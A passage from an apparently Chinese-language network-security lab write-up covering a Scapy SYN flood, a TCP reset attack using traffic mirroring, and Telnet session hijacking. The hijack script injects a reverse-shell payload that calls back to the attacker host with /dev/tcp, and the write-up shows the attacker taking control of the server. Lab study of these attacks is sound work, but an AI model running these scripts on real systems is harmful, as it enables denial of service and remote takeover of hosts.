+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="n">tcp_syn_packet</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="n">RandShort</span><span class="p">(),</span> <span class="n">dport</span><span class="o">=</span><span class="n">target_port</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s2">"S"</span><span class="p">)</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="n">syn_packet</span> <span class="o">=</span> <span class="n">ip_packet</span> <span class="o">/</span> <span class="n">tcp_syn_packet</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="n">send</span><span class="p">(</span><span class="n">syn_packet</span><span class="p">,</span> <span class="n">loop</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</code></pre></div>
+<p>我们在attacker上面运行脚本</p>
+<h5 id="tcp-syn_recv-syn-syn-ack-ack-tcp">在受害者主机上观察 TCP 的半连接状态，SYN_RECV 表示已接收到客户发送的 SYN 报⽂,并回复了 SYN-ACK 报⽂，正在等待客户端发送 ACK 报⽂建⽴ TCP 连接的状态。<a class="headerlink" href="#tcp-syn_recv-syn-syn-ack-ack-tcp" title="Permanent link">&para;</a></h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>netstat<span class="w"> </span>-nat<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>SYN_RECV
+</code></pre></div>
+<p><img alt="image-20261013153151155" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013153151155.png" /></p>
+<p>奇怪的是，无法探测到半连接的状态</p>
+<p>我们用tcpdump</p>
+<p><img alt="image-20261014090517071" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014090517071.png" /></p>
+<p>发现发来的不是192.168.2.100，而是192.168.4.1，是docker的网关,这是因为启用了 <strong>SNAT/MASQUERADE（源地址转换）</strong></p>
+<p>在docker网络搭建的时候关掉这个，但是现在</p>
+<p><img alt="image-20261014093536056" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014093536056.png" /></p>
+<p>现在对了，但是netstat上面还是找不到</p>
+<p>这是因为我们看到这里有Flags[R]，也就是RST</p>
+<p>这个机制是因为</p>
+<p>Scapy 构造 SYN 报文并发送。</p>
+<p>Server 收到 SYN，进入 <code>SYN_RECV</code>。</p>
+<p>Server 向 <code>192.168.3.100</code> 返回 SYN+ACK。</p>
+<p><code>192.168.3.100</code> 的 Linux 内核收到 SYN+ACK。</p>
+<p>但 Linux 内核没有找到与该连接对应的 TCP socket，因为 SYN 是 Scapy 通过原始套接字构造的。</p>
+<p>Linux 内核因此发送 RST，拒绝这个连接</p>
+<p>值得注意的是，实验指导书这边用的是192.168.3.101，原先以为是写错了，现在发现另有乾坤</p>
+<p><img alt="image-20261014094855968" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014094855968.png" /></p>
+<p>原来如此，既然已经存在的机器会发送RST，那只要找一个不存在的机器就好了，我们把源地址修改成192.168.3.101</p>
+<p><img alt="image-20261014101912029" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014101912029.png" /></p>
+<p>诶，现在就可以了，那另一方面，如果我们把192.168.3.100关机呢</p>
+<p><img src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014102003916.png" alt="image-20261014102003916" style="zoom:50%;" /></p>
+<p>在docker里关掉这个，</p>
+<p><img alt="image-20261014102049191" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014102049191.png" /></p>
+<p>也成功了，所以问题就是Linux内核发现了并没有这个TCP连接，自动发送了RST所致</p>
+<p>对⽐开启 SYN Cookies 前后 SYN_RECV 的数量，同时在⽤户主机浏览器上访问受害者Web ⽹站 http://192.168.4.105，对⽐ SYN Cookies 开启和关闭时的差异。</p>
+<p><img alt="image-20261014112057444" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014112057444.png" /></p>
+<p>但是打开却发现无法访问，这是因为我们前面把服务器开在8000端口了，而http默认是80端口</p>
+<p><img alt="image-20261014112154224" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014112154224.png" /></p>
+<p>修改一下就可以了</p>
+<p>我们可以看到它是默认打开的</p>
+<p><img alt="image-20261013153217369" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013153217369.png" /></p>
+<p>(1)未开启 SYN Cookies 时</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_syncookies<span class="o">=</span><span class="m">0</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>netstat<span class="w"> </span>-nat<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>SYN_RECV<span class="w"> </span><span class="p">|</span><span class="w"> </span>wc<span class="w"> </span>-l
+</code></pre></div>
+<p><img alt="image-20261014114613373" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014114613373.png" /></p>
+<p>(2)开启 SYN Cookies 后。</p>
+<p>奇怪的是,关闭前后居然都是6</p>
+<p><img alt="image-20261014114406989" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014114406989.png" /></p>
+<p>这与指导书又不一样了</p>
+<p>一个<strong>非常值得怀疑的原因： HTTP 服务器可能把 TCP 监听队列大小设置成了 5</strong></p>
+<p>检查监听队列大小</p>
+<p>重点看 80 端口对应的 <code>Send-Q</code>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>State   Recv-Q  Send-Q  Local Address:Port
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>LISTEN  0       5       0.0.0.0:80
+</code></pre></div>
+<p>对于处于 <code>LISTEN</code> 状态的 TCP socket：</p>
+<ul>
+<li><code>Recv-Q</code>：当前等待应用接受的已完成连接数量。</li>
+<li><code>Send-Q</code>：应用设置的监听 backlog 上限。</li>
+</ul>
+<p>Linux 内核的 SYN 队列容量也会受到应用调用 <code>listen()</code> 时传入的 backlog 参数影响。<a href="https://lists.openwall.net/netdev/2018/02/02/35?utm_source=chatgpt.com">OpenWall Lists</a></p>
+<p>是因为我们使用下面的命令启动 HTTP 服务</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>python3 -m http.server 80
+</code></pre></div>
+<p>在 Python 3.12 中，<code>socketserver.TCPServer</code> 的默认 <code>request_queue_size</code> 通常为 <strong>5</strong>。而 <code>http.server</code> 就建立在这个类之上。<a href="https://docs.python.org/3.12/library/socketserver.html?utm_source=chatgpt.com">Python documentation</a></p>
+<p><img alt="image-20261014114817329" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014114817329.png" /></p>
+<p>我们把队列改成512试试</p>
+<p>我们重新编写服务器</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">http.server</span><span class="w"> </span><span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">SimpleHTTPRequestHandler</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="k">class</span><span class="w"> </span><span class="nc">Server</span><span class="p">(</span><span class="n">HTTPServer</span><span class="p">):</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>    <span class="n">request_queue_size</span> <span class="o">=</span> <span class="mi">512</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="n">server</span> <span class="o">=</span> <span class="n">Server</span><span class="p">((</span><span class="s2">"0.0.0.0"</span><span class="p">,</span> <span class="mi">80</span><span class="p">),</span> <span class="n">SimpleHTTPRequestHandler</span><span class="p">)</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</code></pre></div>
+<p>诶，这时候就变成385了</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>sysctl net.ipv4.tcp_syncookies
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>netstat -nat | grep SYN_RECV | wc -l
+</code></pre></div>
+<p><img alt="image-20261014120245235" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014120245235.png" /></p>
+<p>如果打开syncookies</p>
+<p><img alt="image-20261014120459692" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014120459692.png" /></p>
+<p>这时候就是513</p>
+<p>实验指导书估计是用apache搭建的，我们用apache来搭建服务器,就是512，385</p>
+<p><img alt="image-20261014143650783" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014143650783.png" /></p>
+<p><img alt="image-20261014144211901" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014144211901.png" /></p>
+<p>但是浏览器这边都能打开啊，没看到影响</p>
+<p>我们把窗口调小一点就行了</p>
+<p><img alt="image-20261014192206115" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014192206115.png" /></p>
+<p>可以看到连不上了</p>
+<p><img alt="image-20261014192311289" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014192311289.png" /></p>
+<h2 id="3tcp"><strong>实验</strong> <strong>3</strong>：<strong>TCP</strong> <strong>连接重置</strong><a class="headerlink" href="#3tcp" title="Permanent link">&para;</a></h2>
+<h3 id="_3">网络拓扑<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p><img alt="image-20261015145447340" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015145447340.png" /></p>
+<h4 id="_4">配置流量镜像<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<p>然后创建专用的镜像规则表：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>nft add table ip lab_mirror
+</code></pre></div>
+<p>创建 PREROUTING 链：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>nft 'add chain ip lab_mirror prerouting { type filter hook prerouting priority -150; policy accept; }'
+</code></pre></div>
+<p>这里选择 <code>PREROUTING</code>，是为了在报文经过后续 NAT 等处理前进行复制。</p>
+<p>镜像服务器发往客户端的报文</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>nft add rule ip lab_mirror prerouting ip saddr 192.168.4.105 ip daddr 192.168.3.100 tcp sport 80 counter dup to 192.168.2.100
+</code></pre></div>
+<p>这条规则表示：当路由器收到：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>192.168.4.105:80 → 192.168.3.100
+</code></pre></div>
+<p>的 TCP 报文时，额外复制一份，经路由发送给：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>192.168.2.100
+</code></pre></div>
+<p>原始报文继续正常转发。</p>
+<p>镜像客户端发往服务器的报文</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>nft add rule ip lab_mirror prerouting ip saddr 192.168.3.100 ip daddr 192.168.4.105 tcp dport 80 counter dup to 192.168.2.100
+</code></pre></div>
+<p>这样，两个方向的 HTTP 流量都会被镜像</p>
+<p><img alt="image-20261014201113108" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014201113108.png" /></p>
+<p>在攻击者主机上使⽤ Scapy 监听⼆者流量，获取 TCP 连接信息，伪造 TCP 重置数据包，实现⽤户主机与受害者服务器之间所有 TCP 流量的中断。在⽤户主机上通过访问正常服务器（192.168.4.106）对⽐ TCP 连接重置的实现效果，下⾯为核⼼代码的构造</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">scapy.all</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span> 
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="n">capture_filter</span> <span class="o">=</span> <span class="s2">"tcp and src 192.168.4.105 and dst 192.168.3.100"</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="k">def</span><span class="w"> </span><span class="nf">packet_callback</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>  <span class="k">if</span> <span class="n">packet</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">packet</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">IP</span><span class="p">):</span>
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>    <span class="n">tcp_sport</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">sport</span> <span class="c1"># 源端⼝</span>
+<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>    <span class="n">tcp_dport</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">dport</span> <span class="c1"># ⽬的端⼝</span>
+<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>    <span class="n">tcp_ack</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">ack</span> <span class="c1"># ACK 序号</span>
+<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>    <span class="c1"># 在 send_reset_packet 函数中进⼀步构造和发送 TCP Reset 包</span>
+<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>    <span class="n">send_reset_packet</span><span class="p">(</span><span class="n">packet</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">,</span> <span class="n">packet</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span><span class="p">,</span> <span class="n">tcp_sport</span><span class="p">,</span> <span class="n">tcp_dport</span><span class="p">,</span> <span class="n">tcp_ack</span><span class="p">)</span>
+<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="k">def</span><span class="w"> </span><span class="nf">send_reset_packet</span><span class="p">(</span><span class="n">ip_src</span><span class="p">,</span> <span class="n">ip_dst</span><span class="p">,</span> <span class="n">port_src</span><span class="p">,</span> <span class="n">port_dst</span><span class="p">,</span> <span class="n">ack</span><span class="p">):</span>
+<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>  <span class="n">ip_layer</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">ip_dst</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip_src</span><span class="p">)</span>
+<a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>  <span class="n">tcp_layer</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="n">port_dst</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="n">port_src</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s1">'R'</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="n">ack</span><span class="p">)</span>
+<a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a>  <span class="n">reset_packet</span> <span class="o">=</span> <span class="n">ip_layer</span> <span class="o">/</span> <span class="n">tcp_layer</span>
+<a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a>  <span class="c1"># 发送构造好的 RST 包</span>
+<a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a>  <span class="n">send</span><span class="p">(</span><span class="n">reset_packet</span><span class="p">)</span>
+<a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a>
+<a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a><span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="n">capture_filter</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">packet_callback</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</code></pre></div>
+<p>连接发现都不支持ssh和ftp</p>
+<p><img alt="image-20261014202418182" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261014202418182.png" /></p>
+<p>继续迭代前面网络拓扑工具，加入了ssh和ftp的支持</p>
+<p>可以看到ssh和telnet、ftp攻击成功了，http没有</p>
+<p><img alt="image-20261015134033620" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015134033620.png" /></p>
+<p>原因是因为attacker发送的rst比较慢，然后http我们下载的文件又太小，attacker还没发送，http已经结束了，</p>
+<p>我们限制一下速率就行</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>wget<span class="w"> </span>--limit-rate<span class="o">=</span>1k<span class="w"> </span>http://192.168.4.105
+</code></pre></div>
+<p><img alt="image-20261015134452033" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015134452033.png" /></p>
+<p>这样就成功了，同时测试了106服务器的telnet，可以正常连接</p>
+<p><img alt="image-20261015134743703" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015134743703.png" /></p>
+<p>ftp和http也没有问题</p>
+<h2 id="4tcp">实验 4：TCP会话劫持<a class="headerlink" href="#4tcp" title="Permanent link">&para;</a></h2>
+<h3 id="_5">网络拓扑<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p><img alt="" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015145447340.png" /></p>
+<h4 id="user-telnetserver">User Telnet登录server<a class="headerlink" href="#user-telnetserver" title="Permanent link">&para;</a></h4>
+<p>在⽤户主机上使⽤ Telnet 正常登录受害者主机。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>telnet<span class="w"> </span><span class="m">192</span>.168.4.105
+</code></pre></div>
+<p><img alt="image-20261015134922916" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015134922916.png" /></p>
+<h4 id="attacker">Attacker编写攻击脚本<a class="headerlink" href="#attacker" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">scapy.all</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span> 
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">capture_filter</span> <span class="o">=</span> <span class="s2">"tcp and src 192.168.4.105 and dst 192.168.3.100"</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="n">spoofed_payload</span> <span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">/bin/bash -i &gt; /dev/tcp/192.168.2.100/9999 0&lt;&amp;1 2&gt;&amp;1</span><span class="se">\n</span><span class="s2">"</span>
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="k">def</span><span class="w"> </span><span class="nf">send_hijacking_packet</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
+<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>  <span class="k">if</span> <span class="n">packet</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">IP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">packet</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">packet</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">):</span>
+<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>    <span class="n">ack_num</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">ack</span> <span class="c1"># ACK 序号</span>
+<a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>    <span class="n">seq_num</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">seq</span>
+<a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">"Capture packets"</span><span class="p">)</span>
+<a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>    <span class="n">ip_layer</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">)</span>
+<a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>    <span class="n">ack_data</span> <span class="o">=</span> <span class="n">seq_num</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span> <span class="c1">#packet 表示捕获到的数据包</span>
+<a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Capture from server to user: SEQ=</span><span class="si">{</span><span class="n">ack_num</span><span class="si">}</span><span class="s2"> ACK=</span><span class="si">{</span><span class="n">ack_data</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>    <span class="c1">#构造 TCP 层，设置 seq、ack、flags</span>
+<a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>    <span class="n">tcp_layer</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">dport</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">sport</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s1">'PA'</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="n">ack_num</span><span class="p">,</span> <span class="n">ack</span><span class="o">=</span><span class="n">ack_data</span><span class="p">)</span>
+<a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>    <span class="n">hijacking_packet</span> <span class="o">=</span> <span class="n">ip_layer</span> <span class="o">/</span> <span class="n">tcp_layer</span> <span class="o">/</span> <span class="n">spoofed_payload</span>
+<a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>    <span class="n">send</span><span class="p">(</span><span class="n">hijacking_packet</span><span class="p">)</span>
+<a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[+] spoofed packets from user to server with payload: </span><span class="si">{</span><span class="n">spoofed_payload</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>
+<a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a><span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="n">capture_filter</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">send_hijacking_packet</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</code></pre></div>
+<h4 id="attackernc">Attacker用nc监听<a class="headerlink" href="#attackernc" title="Permanent link">&para;</a></h4>
+<p>在攻击者主机上运⾏ TCP 劫持脚本后，开启监听⽤于接受反弹 shell 的 TCP 端⼝。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">9999</span><span class="w"> </span><span class="c1">#打开本地 9999 端⼝等待受害者建⽴连接</span>
+</code></pre></div>
+<h4 id="attackershell">Attacker拿到反弹shell<a class="headerlink" href="#attackershell" title="Permanent link">&para;</a></h4>
+<p>在⽤户主机 Telnet 中输⼊内容，促使⽤户主机和受害者主机交互产⽣ TCP 流量。⼀旦⼆者产⽣ TCP 流量，攻击者就能第⼀时间捕获并向受害者推送构造好的内容（步骤 2中的反弹 shell 命令），使得受害者通过 Telnet 执⾏该恶意命令。</p>
+<p>当受害者主机成功执⾏反弹 shell 命令后，受害者主机将会主动向攻击者主机建⽴连接，继⽽攻击者主机实现远程控制受害者主机</p>
+<p><img alt="image-20261015145207076" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015145207076.png" /></p>
+<p><img alt="image-20261015145235896" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261015145235896.png" /></p>
+<p>可以看到attacker可以直接用反弹shell控制server，user那边完全输入不了</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/infinitepwn" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 